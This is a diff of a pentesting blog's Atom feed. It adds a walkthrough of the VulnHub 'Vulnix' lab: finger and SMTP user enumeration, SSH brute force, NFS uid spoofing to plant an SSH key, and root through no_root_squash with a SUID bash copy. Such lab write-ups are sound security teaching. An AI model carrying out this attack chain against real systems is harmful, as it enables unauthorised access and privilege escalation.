@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-19T12:53:58-04:00</updated>
+  <updated>2017-06-21T11:01:26-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,453 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
+    <updated>2017-06-20T08:04:29-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
+    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>
+
+<!-- more -->
+
+
+<p>Here are the Nmap results:</p>
+
+<p><code>
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+25/tcp    open  smtp       Postfix smtpd
+79/tcp    open  finger     Linux fingerd
+110/tcp   open  pop3?
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+143/tcp   open  imap       Dovecot imapd
+512/tcp   open  exec       netkit-rsh rexecd
+513/tcp   open  login
+514/tcp   open  tcpwrapped
+993/tcp   open  ssl/imap   Dovecot imapd
+995/tcp   open  ssl/pop3s?
+2049/tcp  open  nfs_acl    2-3 (RPC #100227)
+36190/tcp open  status     1 (RPC #100024)
+40731/tcp open  mountd     1-3 (RPC #100005)
+43539/tcp open  nlockmgr   1-4 (RPC #100021)
+46423/tcp open  mountd     1-3 (RPC #100005)
+52024/tcp open  mountd     1-3 (RPC #100005)
+</code></p>
+
+<h3>finger user enumeration</h3>
+
+<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>
+
+<p><code>
+finger @192.168.217.142
+No one logged on.
+</code></p>
+
+<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>
+
+<p><code>
+finger root@192.168.217.142
+Login: root                     Name: root
+Directory: /root                        Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+</code></p>
+
+<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>
+
+<p>```
+finger <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#117;&#115;&#x65;&#114;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#55;&#46;&#49;&#x34;&#50;">&#117;&#115;&#x65;&#x72;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#x2e;&#49;&#x34;&#50;</a>
+Login: user                     Name: user
+Directory: /home/user                   Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.</p>
+
+<p>Login: dovenull                 Name: Dovecot login user
+Directory: /nonexistent                 Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.</p>
+
+<p>finger <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x76;&#117;&#108;&#x6e;&#x69;&#120;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#50;&#49;&#x37;&#x2e;&#49;&#52;&#x32;">&#118;&#117;&#108;&#110;&#x69;&#x78;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x32;&#x31;&#55;&#x2e;&#x31;&#x34;&#50;</a>
+Login: vulnix                   Name:
+Directory: /home/vulnix                 Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+```</p>
+
+<h3>SMTP user enumeration</h3>
+
+<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>
+
+<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>
+
+<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
+Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
+work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>
+
+<p>Let&rsquo;s see its options:</p>
+
+<p>```
+smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>
+
+<p>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )</p>
+
+<p>options are:</p>
+
+<pre><code>    -m n     Maximum number of processes (default: 5)
+-M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
+-u user  Check if user exists on remote system
+-f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
+    -D dom   Domain to append to supplied user list to make email addresses (Default: none)
+             Use this option when you want to guess valid email addresses instead of just usernames
+             e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
+                  simply the usernames foo and bar.
+-U file  File of usernames to check via smtp service
+-t host  Server host running smtp service
+-T file  File of hostnames running the smtp service
+-p port  TCP port on which smtp service runs (default: 25)
+-d       Debugging output
+-t n     Wait a maximum of n seconds for reply (default: 5)
+-v       Verbose
+-h       This help message
+</code></pre>
+
+<p>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.</p>
+
+<p>Examples:</p>
+
+<p>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
+$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
+$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
+$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
+```</p>
+
+<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>
+
+<p>```
+root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
+Starting smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>
+
+<hr />
+
+
+
+<hr />
+
+<p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; VRFY
+Worker Processes &hellip;&hellip;&hellip; 5
+Usernames file &hellip;&hellip;&hellip;.. users.txt
+Target count &hellip;&hellip;&hellip;&hellip;. 1
+Username count &hellip;&hellip;&hellip;.. 6
+Target TCP port &hellip;&hellip;&hellip;. 25
+Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
+Target domain &hellip;&hellip;&hellip;&hellip;</p>
+
+<h6>## Scan started at Tue Jun 20 09:29:30 2017</h6>
+
+<p>192.168.217.142: root exists
+192.168.217.142: vulnix exists
+192.168.217.142: user exists
+192.168.217.142: postmaster exists
+192.168.217.142: mail exists</p>
+
+<h6>## Scan completed at Tue Jun 20 09:29:30 2017</h6>
+
+<p>5 results.</p>
+
+<p>6 queries in 1 seconds (6.0 queries / sec)
+```</p>
+
+<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>
+
+<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>
+
+<h3>Exploit NFS</h3>
+
+<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>
+
+<p>```
+rpcinfo -p 192.168.217.142
+   program vers proto   port  service</p>
+
+<pre><code>100000    4   tcp    111  portmapper
+100000    3   tcp    111  portmapper
+100000    2   tcp    111  portmapper
+100000    4   udp    111  portmapper
+100000    3   udp    111  portmapper
+100000    2   udp    111  portmapper
+100024    1   udp  39427  status
+100024    1   tcp  42309  status
+100003    2   tcp   2049  nfs
+100003    3   tcp   2049  nfs
+100003    4   tcp   2049  nfs
+100227    2   tcp   2049
+100227    3   tcp   2049
+100003    2   udp   2049  nfs
+100003    3   udp   2049  nfs
+100003    4   udp   2049  nfs
+100227    2   udp   2049
+100227    3   udp   2049
+100021    1   udp  39258  nlockmgr
+100021    3   udp  39258  nlockmgr
+100021    4   udp  39258  nlockmgr
+100021    1   tcp  34418  nlockmgr
+100021    3   tcp  34418  nlockmgr
+100021    4   tcp  34418  nlockmgr
+100005    1   udp  34638  mountd
+100005    1   tcp  52581  mountd
+100005    2   udp  42603  mountd
+100005    2   tcp  53226  mountd
+100005    3   udp  49704  mountd
+100005    3   tcp  47770  mountd
+</code></pre>
+
+<p>```</p>
+
+<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>
+
+<p><code>
+root@kali:~# showmount -e 192.168.217.142
+Export list for 192.168.217.142:
+/home/vulnix *
+</code></p>
+
+<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>
+
+<p>```
+nmap -sV -p111 &mdash;script=nfs-showmount 192.168.217.142</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-21 06:00 EDT
+Nmap scan report for 192.168.217.142
+Host is up (0.00027s latency).
+PORT    STATE SERVICE VERSION
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| nfs-showmount:
+|<em>  /home/vulnix *
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      47770/tcp  mountd
+|   100005  1,2,3      49704/udp  mountd
+|   100021  1,3,4      34418/tcp  nlockmgr
+|   100021  1,3,4      39258/udp  nlockmgr
+|   100024  1          39427/udp  status
+|   100024  1          42309/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|</em>  100227  2,3         2049/udp  nfs_acl
+```</p>
+
+<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>
+
+<p>```
+msf auxiliary(nfsmount) > run</p>
+
+<p>[+] 192.168.217.142:111   &ndash; 192.168.217.142 NFS Export: /home/vulnix [<em>]
+[</em>] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```</p>
+
+<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>
+
+<p><code>
+root@kali:/mnt# mkdir nfs
+root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
+</code></p>
+
+<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>
+
+<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>
+
+<p><code>
+nfs&gt; help
+host &lt;host&gt; - set remote host name
+uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
+gid [&lt;gid&gt;] - set remote group id
+cd [&lt;path&gt;] - change remote working directory
+lcd [&lt;path&gt;] - change local working directory
+cat &lt;filespec&gt; - display remote file
+ls [-l] &lt;filespec&gt; - list remote directory
+get &lt;filespec&gt; - get remote files
+df - file system information
+rm &lt;file&gt; - delete remote file
+ln &lt;file1&gt; &lt;file2&gt; - link file
+mv &lt;file1&gt; &lt;file2&gt; - move file
+mkdir &lt;dir&gt; - make remote directory
+rmdir &lt;dir&gt; - remove remote directory
+chmod &lt;mode&gt; &lt;file&gt; - change mode
+chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
+put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
+mount [-upTU] [-P port] &lt;path&gt; - mount file system
+umount - umount remote file system
+umountall - umount all remote file systems
+export - show all exported file systems
+dump - show all remote mounted file systems
+status - general status report
+help - this help message
+quit - its all in the name
+bye - good bye
+handle [&lt;handle&gt;] - get/set directory file handle
+mknod &lt;name&gt; [b/c major minor] [p] - make device
+</code></p>
+
+<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>
+
+<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="&lsquo;hydra&rsquo; &lsquo;letmein&rsquo;" ></p>
+
+<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>
+
+<p><code>
+user@vulnix:~$ id vulnix
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+</code></p>
+
+<p>I went back to nfsshell and made the changes:</p>
+
+<p><code>
+nfs&gt; host 192.168.217.142
+Using a privileged port (1023)
+Open 192.168.217.142 (192.168.217.142) TCP
+nfs&gt; uid 2008
+nfs&gt; gid 2008
+nfs&gt; status
+User id      : 2008
+Group id     : 2008
+Remote host  : `192.168.217.142'
+Transfer size: 0
+</code></p>
+
+<p>Now I was able to access the share:</p>
+
+<p><code>
+nfs&gt; ls -l
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
+</code></p>
+
+<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>
+
+<p><code>
+root@kali:~# su vulnix
+$ id
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+$ cd /tmp
+$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in vulnix.
+Your public key has been saved in vulnix.pub.
+The key fingerprint is:
+SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|  .o.oo.++o+o .oo|
+|   +o. o .o. ..+ |
+|  = + o .   o...o|
+| o = o     . oo.+|
+|    = + S o  ..+o|
+|   o . + + o  .oo|
+|  .     o +    o.|
+|  ..       .    .|
+|.E.              |
++----[SHA256]-----+
+</code></p>
+
+<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>
+
+<p><code>
+$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
+$ cat .ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
+</code></p>
+
+<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#118;&#117;&#108;&#x6e;&#105;&#120;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x31;&#x37;&#46;&#x31;&#52;&#x32;">&#118;&#117;&#108;&#x6e;&#105;&#120;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#x31;&#x34;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>
+
+<p>```
+vulnix@vulnix:~$ sudo -l
+Matching &lsquo;Defaults&rsquo; entries for vulnix on this host:</p>
+
+<pre><code>env_reset,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</code></pre>
+
+<p>User vulnix may run the following commands on this host:</p>
+
+<pre><code>(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+</code></pre>
+
+<p>```</p>
+
+<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>
+
+<p><code>
+vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
+vulnix@vulnix:~$ ls -l
+total 900
+-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
+</code></p>
+
+<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>
+
+<p>From the SSH, I verified it as the vulnix user:</p>
+
+<p><code>
+vulnix@vulnix:~$ ls -l bash
+-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
+</code></p>
+
+<p>Finally, I ran the shell while preserving its permissions:</p>
+
+<p><code>
+vulnix@vulnix:~$ ./bash -p
+bash-4.2# whoami
+root
+bash-4.2# cat /root/trophy.txt
+cc614640424f5bd60ce5d5264899c3be
+</code></p>
+
+<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
+<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
+<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
+</ul>
+
+
+<p>```</p>
+
+<hr />
+
+<p>/ Q: What do you call a half-dozen    \
+| Indians with Asian flu? A: Six sick |
+\ Sikhs (sic).                        /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
@@ -52,7 +499,7 @@ functionality to enum.exe formerly available from www.bindview.com.</p>
 <p>```
 num4linux
 enum4linux v0.8.9 (<a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a>)
-Copyright &copy; 2011 Mark Lowe (<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6d;&#x72;&#108;&#x40;&#x70;&#x6f;&#x72;&#x74;&#99;&#117;&#108;&#x6c;&#x69;&#115;&#x2d;&#115;&#101;&#99;&#x75;&#x72;&#105;&#x74;&#121;&#46;&#99;&#111;&#x6d;">&#x6d;&#114;&#x6c;&#x40;&#112;&#x6f;&#x72;&#x74;&#99;&#117;&#108;&#x6c;&#105;&#115;&#45;&#115;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#121;&#46;&#99;&#x6f;&#x6d;</a>)</p>
+Copyright &copy; 2011 Mark Lowe (<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#109;&#114;&#108;&#64;&#x70;&#111;&#x72;&#x74;&#x63;&#117;&#x6c;&#x6c;&#105;&#x73;&#45;&#x73;&#x65;&#99;&#x75;&#x72;&#x69;&#116;&#x79;&#x2e;&#99;&#x6f;&#x6d;">&#109;&#114;&#108;&#64;&#112;&#x6f;&#x72;&#x74;&#99;&#x75;&#108;&#x6c;&#105;&#115;&#45;&#115;&#x65;&#x63;&#117;&#114;&#105;&#116;&#x79;&#46;&#99;&#x6f;&#x6d;</a>)</p>
 
 <p>Simple wrapper around the tools in the samba package to provide similar
 functionality to enum.exe (formerly from www.bindview.com).  Some additional
@@ -480,7 +927,7 @@ local networks.</p></blockquote>
 
 <p>```
 Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
-Written by: Jaime Penalba <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#x70;&#101;&#110;&#97;&#108;&#98;&#97;&#x65;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x6a;&#x70;&#101;&#x6e;&#97;&#108;&#x62;&#x61;&#101;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+Written by: Jaime Penalba <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#106;&#x70;&#101;&#x6e;&#97;&#108;&#98;&#97;&#x65;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#106;&#112;&#101;&#110;&#x61;&#x6c;&#x62;&#x61;&#x65;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a></p>
 
 <p>Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
   -i device: your network device
@@ -696,7 +1143,7 @@ Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>
 <p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:</p>
 
 <p>```
-ssh <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#115;&#109;&#x65;&#x61;&#103;&#111;&#108;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#x32;&#49;&#55;&#46;&#x31;&#x33;&#x36;">&#115;&#109;&#101;&#x61;&#x67;&#111;&#108;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#49;&#x37;&#46;&#x31;&#x33;&#x36;</a>
+ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#115;&#x6d;&#101;&#x61;&#x67;&#x6f;&#x6c;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#49;&#x37;&#x2e;&#x31;&#51;&#x36;">&#x73;&#x6d;&#x65;&#97;&#x67;&#x6f;&#108;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#50;&#x31;&#x37;&#x2e;&#49;&#x33;&#x36;</a>
 The authenticity of host &lsquo;192.168.217.136 (192.168.217.136)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -720,7 +1167,7 @@ Warning: Permanently added &lsquo;192.168.217.136&rsquo; (ECDSA) to the list of 
 </code></pre>
 
 <p>Easy as 1,2,3
-<a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x73;&#109;&#101;&#x61;&#x67;&#x6f;&#x6c;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#49;&#55;&#46;&#49;&#x33;&#54;">&#x73;&#x6d;&#x65;&#97;&#103;&#111;&#108;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#50;&#49;&#x37;&#x2e;&#49;&#51;&#54;</a>&rsquo;s password:
+<a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#115;&#109;&#101;&#x61;&#103;&#x6f;&#x6c;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#x31;&#55;&#x2e;&#49;&#51;&#54;">&#x73;&#109;&#101;&#97;&#103;&#x6f;&#x6c;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x31;&#x37;&#46;&#x31;&#51;&#x36;</a>&rsquo;s password:
 ```</p>
 
 <p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>
@@ -1238,7 +1685,7 @@ Connecting to shell-storm.org&hellip;</p>
  Copyright &copy; 2013 Geyslan G. Bem, Hacking bits</p>
 
 <p>   <a href="http://hackingbits.com">http://hackingbits.com</a>
-   <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#103;&#101;&#121;&#x73;&#x6c;&#97;&#x6e;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#103;&#x65;&#121;&#x73;&#108;&#97;&#x6e;&#64;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+   <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x67;&#x65;&#121;&#x73;&#x6c;&#x61;&#x6e;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#101;&#x79;&#115;&#108;&#x61;&#110;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a></p>
 
 <p> This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
@@ -1810,338 +2257,6 @@ No results found in the THMD5
 <hr />
 
 <p>&lt; Condense soup, not books! ></p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Masscan - Kali Linux tools]]></title>
-    <link href="http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools/"/>
-    <updated>2017-06-10T04:17:42-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools</id>
-    <content type="html"><![CDATA[<p>Nmap is our favorite port scanner, but if you want to scan billions of hosts, and still be relatively young when you get the results, there is a solid alternative focused entirely on speed: Masscan &ndash; the Mass IP port scanner</p>
-
-<!-- more -->
-
-
-<p>Homepage: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
-
-<h2>masscan description</h2>
-
-<blockquote><p>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10
-million packets per second.</p>
-
-<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand,
-unicornscan, and ZMap, using asynchronous transmission. The major difference is that it&rsquo;s faster than these other
-scanners. In addition, it&rsquo;s more flexible, allowing arbitrary address ranges and port ranges.</p>
-
-<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local
-TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your
-operating system to firewall the ports that masscan uses.</p>
-
-<p>This program spews out packets very fast. On Windows, or from VMs, it can do 300,000 packets/second. On Linux (no
-virtualization) it&rsquo;ll do 1.6 million packets-per-second. That&rsquo;s fast enough to melt most networks.</p>
-
-<p>Note that it&rsquo;ll only melt your own network. It randomizes the target IP addresses so that it shouldn&rsquo;t overwhelm any
-distant network.</p>
-
-<p>By default, the rate is set to 100 packets/second.</p></blockquote>
-
-<h2>masscan options</h2>
-
-<p><code>
-root@kali:~# masscan                                                         
-usage:
-masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
- scan some web ports on 10.x.x.x at 10kpps
-masscan --nmap
